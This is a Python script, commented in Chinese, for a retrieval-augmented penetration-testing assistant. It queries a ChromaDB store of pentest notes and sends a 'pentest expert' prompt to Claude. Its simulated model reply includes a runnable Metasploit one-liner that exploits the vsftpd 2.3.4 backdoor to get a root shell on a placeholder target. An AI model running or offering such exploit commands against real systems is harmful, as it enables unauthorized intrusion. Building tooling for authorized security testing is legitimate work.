import argparse
import chromadb
from chromadb.utils import embedding_functions

# --- 步驟 4: 呼叫大型語言模型 (LLM) ---
# 這是一個模擬函數。您需要將這裡替換成您實際呼叫 Claude API 的程式碼。
# 您會需要使用 Anthropic 的官方 Python 函式庫 (pip install anthropic)。
def call_claude_api(prompt: str) -> str:
    """
    模擬呼叫 Claude API 的函數。

    Args:
        prompt (str): 包含上下文和問題的完整提示。

    Returns:
        str: 模擬的 LLM 回應。
    """
    print("\n" + "="*50)
    print("--- 準備發送給 Claude 的完整提示 (Prompt) ---")
    print(prompt)
    print("="*50 + "\n")
    
    # --- 在這裡替換成您的 Claude API 呼叫 ---
    # 範例 (請根據 Anthropic 官方文件進行修改):
    #
    import anthropic
    #
    client = anthropic.Anthropic(
    #   # defaults to os.environ.get("ANTHROPIC_API_KEY")
        api_key="<api-key>",
    )
    #
    try:
        message = client.messages.create(
            model="claude-3-opus-20240229", # 或其他您想使用的模型
            max_tokens=2048,
            messages=[
                {"role": "user", "content": prompt}
            ]
        )
        return message.content[0].text
    except Exception as e:
        print(f"呼叫 Claude API 時發生錯誤: {e}")
        return "無法從 Claude 獲得回應。"
    
    # --- 模擬回應 ---
    print("--- (模擬) Claude 正在生成回應... ---")
    simulated_response = """
分析：根據提供的上下文，vsftpd 2.3.4 版本存在一個已知的後門漏洞 (CVE-2011-2523)。當使用者名稱以 `:)` 結尾登入時，會在 6200 連接埠上觸發一個 root shell。

下一步行動：我將使用 Metasploit Framework 來快速驗證並利用這個漏洞。

建議指令：
```bash
msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS [目標IP]; set PAYLOAD cmd/unix/interact; run'
```
    """
    return simulated_response


def query_rag_system(query_text: str, db_path: str, collection_name: str):
    """
    查詢 RAG 系統並將結果傳遞給 LLM。

    Args:
        query_text (str): 使用者的原始查詢問題。
        db_path (str): ChromaDB 資料庫的路徑。
        collection_name (str): ChromaDB 中的集合名稱。
    """
    # --- 步驟 1: 連接到現有的向量資料庫 ---
    print("正在初始化嵌入模型...")
    # 必須使用與建庫時相同的嵌入模型
    sentence_transformer_ef = embedding_functions.SentenceTransformerEmbeddingFunction(
        model_name="all-MiniLM-L6-v2"
    )

    print(f"正在連接到 ChromaDB 資料庫: ./{db_path}")
    client = chromadb.PersistentClient(path=db_path)
    
    try:
        collection = client.get_collection(
            name=collection_name,
            embedding_function=sentence_transformer_ef
        )
    except Exception as e:
        print(f"錯誤：無法獲取集合 '{collection_name}'。請確保名稱正確且資料庫存在。")
        print(e)
        return

    # --- 步驟 2: 查詢資料庫以獲取相關上下文 ---
    print(f"\n正在為您的問題查詢知識庫...")
    results = collection.query(
        query_texts=[query_text],
        n_results=5  # 取得最相關的 5 個 chunks 作為參考資料
    )

    retrieved_docs = results['documents'][0]
    retrieved_metadatas = results['metadatas'][0]

    # --- 步驟 3: 建立提供給 LLM 的上下文 (Context) ---
    context_string = ""
    for i, doc in enumerate(retrieved_docs):
        source = retrieved_metadatas[i].get('source_url', 'N/A')
        context_string += f"--- 參考資料 {i+1} (來源: {source}) ---\n"
        context_string += doc + "\n\n"

    # --- 步驟 4: 建立一個結構化的提示 (Prompt) ---
    # 這是一個非常重要的步驟，好的提示能引導 LLM 產出更高品質的結果。
    prompt_template = f"""
您是一位世界級的滲透測試專家。請根據以下提供的「參考資料」，專業地回答使用者的「問題」。
您的回答應該包含清晰的分析、建議的行動步驟，並在適當時提供具體的指令。
如果「參考資料」中沒有足夠的資訊來回答問題，請明確指出，並建議使用者可以從哪些方向進一步偵察。

--- 參考資料 ---
{context_string}
--- 使用者的問題 ---
{query_text}

--- 您的專家級回應 ---
"""

    # --- 步驟 5: 呼叫 LLM 並取得最終結果 ---
    final_response = call_claude_api(prompt_template)

    print("\n✅ --- Claude 的最終回應 --- ✅")
    print(final_response)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="查詢 RAG 系統並與 LLM 整合的腳本。")
    parser.add_argument(
        "-q", 
        "--query", 
        required=True, 
        help="您想詢問的滲透測試問題。"
    )
    parser.add_argument(
        "-db", 
        "--db_path", 
        default="hacktricks_db", 
        help="ChromaDB 資料庫的路徑。"
    )
    parser.add_argument(
        "-cn", 
        "--collection_name", 
        default="pentest_docs", 
        help="ChromaDB 中的集合名稱。"
    )

    args = parser.parse_args()
    query_rag_system(args.query, args.db_path, args.collection_name)
